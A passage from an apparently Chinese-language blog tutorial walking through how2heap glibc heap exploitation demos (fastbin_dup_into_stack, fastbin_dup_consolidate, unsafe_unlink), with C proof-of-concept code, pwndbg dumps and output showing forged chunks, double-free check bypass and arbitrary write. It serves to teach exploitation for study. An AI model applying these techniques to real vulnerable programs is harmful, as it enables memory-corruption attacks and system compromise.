malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">  <span class="number">40</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">► <span class="number">41</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">  <span class="number">42</span> <span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">  <span class="number">43</span> <span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">  <span class="number">44</span> <span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">  <span class="number">45</span> stack_var = <span class="number">0x20</span>;</span><br></pre></td></tr></table></figure><p>这个时候 程序会从 fastbins 里取一个，由于fastbins 是 LIFO （Last in First out）。 chunk A 会被取出使用。倘若我们这个时候能对 chunk D 进行操作，如 <code>d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code> 由于 <code>stack_var = 0x20;</code>这样的定义是在函数内，所以<code>stack_var</code>的地址将在栈上，通过对指针 <strong>d</strong> 的操作，我们可以伪造一个 chunk ，并将这个 chunk 放在栈上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x&#x2F;20a 0x603000</span><br><span class="line">0x603000:0x00x21</span><br><span class="line">0x603010:0x7fffffffe3880x0</span><br><span class="line">0x603020:0x00x21</span><br><span class="line">0x603030:0x6030000x0</span><br><span class="line">0x603040:0x00x21</span><br><span class="line">0x603050:0x00x0</span><br><span class="line">0x603060:0x00x20fa1</span><br><span class="line">0x603070:0x00x0</span><br><span class="line">0x603080:0x00x0</span><br><span class="line">0x603090:0x00x0</span><br><span class="line">Pwndbg&gt; x&#x2F;20a 0x7fffffffe388</span><br><span class="line">0x7fffffffe388:0x40097c &lt;main+758&gt;0x20</span><br><span class="line">0x7fffffffe398:0x6030100x603030</span><br><span class="line">0x7fffffffe3a8:0x6030500x603010</span><br><span class="line">0x7fffffffe3b8:0xc3e158ae04ceee000x4009a0 &lt;__libc_csu_init&gt;</span><br><span class="line">0x7fffffffe3c8:0x7ffff7a303f1 &lt;__libc_start_main+241&gt;0x40000</span><br><span class="line">0x7fffffffe3d8:0x7fffffffe4a80x1f7b9a488</span><br><span class="line">0x7fffffffe3e8:0x400686 &lt;main&gt;0x0</span><br><span class="line">0x7fffffffe3f8:0x4ffa6e8ae3316c560x400590 &lt;_start&gt;</span><br><span class="line">0x7fffffffe408:0x7fffffffe4a00x0</span><br><span class="line">0x7fffffffe418:0x00xb00591f537d16c56</span><br><span class="line">Pwndbg&gt; stack 10</span><br><span class="line">00:0000│ rsp  0x7fffffffe390 ◂— 0x20 &#x2F;* &#39; &#39; *&#x2F;</span><br><span class="line">01:0008│      0x7fffffffe398 —▸ 0x603010 —▸ 0x7fffffffe388 —▸ 0x40097c (main+758) ◂— 0x4d8b4800000000b8</span><br><span class="line">02:0010│      0x7fffffffe3a0 —▸ 0x603030 —▸ 0x603000 ◂— 0x0</span><br><span class="line">03:0018│      0x7fffffffe3a8 —▸ 0x603050 ◂— 0x0</span><br><span class="line">04:0020│      0x7fffffffe3b0 —▸ 0x603010 —▸ 0x7fffffffe388 —▸ 0x40097c (main+758) ◂— 0x4d8b4800000000b8</span><br><span class="line">05:0028│      0x7fffffffe3b8 ◂— 0xc3e158ae04ceee00</span><br><span class="line">06:0030│ rbp  0x7fffffffe3c0 —▸ 0x4009a0 (__libc_csu_init) ◂— 0x41ff894156415741</span><br><span class="line">07:0038│      0x7fffffffe3c8 —▸ 0x7ffff7a303f1 (__libc_start_main+241) ◂— mov    edi, eax</span><br><span class="line">08:0040│      0x7fffffffe3d0 ◂— 0x40000</span><br><span class="line">09:0048│      0x7fffffffe3d8 —▸ 0x7fffffffe4a8 —▸ 0x7fffffffe6ea ◂— 0x77732f656d6f682f (&#39;&#x2F;home&#x2F;sw&#39;)</span><br></pre></td></tr></table></figure><p><code>stack_var = 0x20;</code> 是由于伪造的 chunk 要由 设置size，size的位置位于 地址-0x8的地方。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜  glibc_2.25 git:(master) ✗ .&#x2F;fastbin_dup_into_stack</span><br><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7fff02a085c8.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x146b010</span><br><span class="line">2nd malloc(8): 0x146b030</span><br><span class="line">3rd malloc(8): 0x146b050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x146b010 again, things will crash because 0x146b010 is at the top of the free list.</span><br><span class="line">So, instead, we&#39;ll free 0x146b030.</span><br><span class="line">Now, we can free 0x146b010 again, since it&#39;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x146b010, 0x146b030, 0x146b010 ]. We&#39;ll now carry out our attack by modifying data at 0x146b010.</span><br><span class="line">1st malloc(8): 0x146b010</span><br><span class="line">2nd malloc(8): 0x146b030</span><br><span class="line">Now the free list has [ 0x146b010 ].</span><br><span class="line">Now, we have access to 0x146b010 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x146b010 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x146b010, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7fff02a085c8</span><br></pre></td></tr></table></figure><p>最后效果如上，我们发现当 chunk a 被拿出来后,由于我们伪造了chunk a 的 fd，造成如下效果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 —▸ 0x7fffffffe388 —▸ 0x603010 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><p>这个时候形成如上的链表结构，这个时候当我们再 malloc 一块内存的时候，系统会误以为 是我们 fake 的chunk是free的。他会把这块 chunk 拿出来用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x603060</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x7fffffffe388,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x603020 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x603000,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小结：对于 fastbins，可以通过 double-free 覆盖 fastbins 的结构，来获得一个指向任意地址的指针。如果我们把这个地址指向 got 地址，如果我们可对 chunk 进行写或者读操作，我们就有了任意地址写 和 任意地址读。</p><h3 id="0x04-fastbin-dup-consolidate"><a href="#0x04-fastbin-dup-consolidate" class="headerlink" title="0x04 fastbin_dup_consolidate"></a>0x04 fastbin_dup_consolidate</h3><p>我们上一条 0x02 介绍了一个 fast double free 的绕过机制，通过在free 同一个 chunk中的中间插入对另外一个chunk 的free。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="built_in">free</span>(p1);</span><br></pre></td></tr></table></figure><p>这里 shellphish 向我们展示了 large bin 中 mallo_consolidata 机制 fast 对double free 的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated two fastbins: p1=%p p2=%p\n&quot;</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now free p1!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Trigger the double free vulnerability!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice: %p %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的编译后 gdb 挂载运行。</p><p>首先是两个malloc</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814182745.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814182745.png"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x6020a0</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x51,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602050 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x51,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6020a0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x20f61,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后释放 p 1,讲他加入到 fastbins中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x602000 ◂— 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">Pwndbg&gt; heap</span><br></pre></td></tr></table></figure><p>当我们在中插入 <code>malloc(0x400)</code> 创建一个 large bins的时候。</p><hr><p>large bins</p><p> chunk 的指针数组, 每个元素是一条 双向循环链表的头部, 但同一条链表中块的大小不一 定相同, 按照从大到小的顺序排列, 每个 bin 保存一定 大小范围的块。主要保存大小 1024 字节以上的块。 </p><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">Pwndbg&gt; small bins</span><br><span class="line">No symbol <span class="string">&quot;bins&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x7ffff7dd1b68 (main_arena+104) ◂— 0x7ffff7dd1b68</span><br><span class="line">0x30: 0x7ffff7dd1b78 (main_arena+120) ◂— 0x7ffff7dd1b78</span><br><span class="line">0x40: 0x7ffff7dd1b88 (main_arena+136) ◂— 0x7ffff7dd1b88</span><br><span class="line">0x50: 0x602000 —▸ 0x7ffff7dd1b98 (main_arena+152) ◂— 0x602000</span><br></pre></td></tr></table></figure><p>我们会发现 原本在 fastbins 的 chunk p1 跑到了 small bins 里。而且 chunk p2 的prev_size 和size字段都被修改了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x6024b0</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x51,</span><br><span class="line">  fd = 0x7ffff7dd1b98 &lt;main_arena+152&gt;,</span><br><span class="line">  bk = 0x7ffff7dd1b98 &lt;main_arena+152&gt;,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602050 &#123;</span><br><span class="line">  prev_size = 0x50,</span><br><span class="line">  size = 0x50,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6020a0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x411,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6024b0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x20b51,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看看 large bin的分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">   While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">   even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">   fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">   Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">   large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">   invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">   it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>当分配 large chunk 时，首先根据 chunk 的大小获得对应的 large bin 的 index，接着判断当前分配区的 fast bins 中是否包含 chunk，如果有，调用 malloc_consolidate() 函数合并 fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin 中。因为这里分配的是一个 large chunk，所以 unsorted bin 中的 chunk 按照大小被放回 small bins 或 large bins 中。这个时候我们就可以再次释放 p1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x602000 ◂— 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">Pwndbg&gt; smallbins</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x7ffff7dd1b68 (main_arena+104) ◂— 0x7ffff7dd1b68</span><br><span class="line">0x30: 0x7ffff7dd1b78 (main_arena+120) ◂— 0x7ffff7dd1b78</span><br><span class="line">0x40: 0x7ffff7dd1b88 (main_arena+136) ◂— 0x7ffff7dd1b88</span><br><span class="line">0x50: 0x602000 ◂— 0x0</span><br></pre></td></tr></table></figure><p>这个时候，我们既有fastbins中的 chunk p1 也有small bins 的chunk p2。我们可以malloc两次，第一次从fastbins取出，第二次从small bins中取出。且这两块新 chunk 处于同一个位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocated two fastbins: p1&#x3D;0x220a010 p2&#x3D;0x220a060</span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3&#x3D;0x220a0b0</span><br><span class="line">In malloc_consolidate(), p1 is moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can pass the check in malloc() since p1 is not fast top.</span><br><span class="line">Now p1 is in unsorted bin and fast bin. So we&#39;will get it twice: 0x220a010 0x220a010</span><br></pre></td></tr></table></figure><h3 id="0x05-unsafe-unlink"><a href="#0x05-unsafe-unlink" class="headerlink" title="0x05 unsafe_unlink"></a>0x05 unsafe_unlink</h3><p>Exploiting free on a corrupted chunk to get arbitrary write. </p><p>利用 free 改写全局指针 chunk0_ptr 达到任意内存写的目的，即 unsafe unlink。</p><p>首先我们创建两个chunk 分别为chunk_0 和chunk_1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000-0x10</span><br><span class="line">0x602ff0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000091            &lt;- chunk 0</span><br><span class="line">0x603020:0x00000000000000000x0000000000000000</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000091            &lt;- chunk 1</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000x0000000000000000</span><br><span class="line">0x603120:0x00000000000000000x0000000000020ee1</span><br></pre></td></tr></table></figure><p>紧接着我们假设这个时候我们有堆溢出，可以对chunk 0 进行修改，我们伪造个chunk。由于有<code>P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P)</code> 这样的检查。我们可以利用全局指针 <code>chunk0_ptr</code> 构造 fake chunk 来绕过它：</p><p>我们伪造 fake chunk 的fd 为 <code>chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);</code></p><p>我们伪造 fake chunk 的bk 为<code>chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);</code></p><p>这个时候</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000-0x10</span><br><span class="line">0x602ff0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000091   &lt;-- chunk 0</span><br><span class="line">0x603010:0x00000000000000000x0000000000000000   &lt;-- fake chunk</span><br><span class="line">0x603020:0x00000000006020580x0000000000602060        fd ,bk</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000091    &lt;-- chunk 1 &lt;-- prev_size</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000x0000000000000000</span><br><span class="line">0x603120:0x00000000000000000x0000000000020ee1</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/5gx 0x0000000000602058</span><br><span class="line">0x602058:0x00000000000000000x00007ffff7dd2520               &lt;-- fake chunk FD</span><br><span class="line">0x602068 &lt;completed.7557&gt;:0x00000000000000000x0000000000603010 &lt;-- bk pointer</span><br><span class="line">0x602078:0x0000000000000000</span><br><span class="line">Pwndbg&gt; x/5gx 0x0000000000602060</span><br><span class="line">0x602060 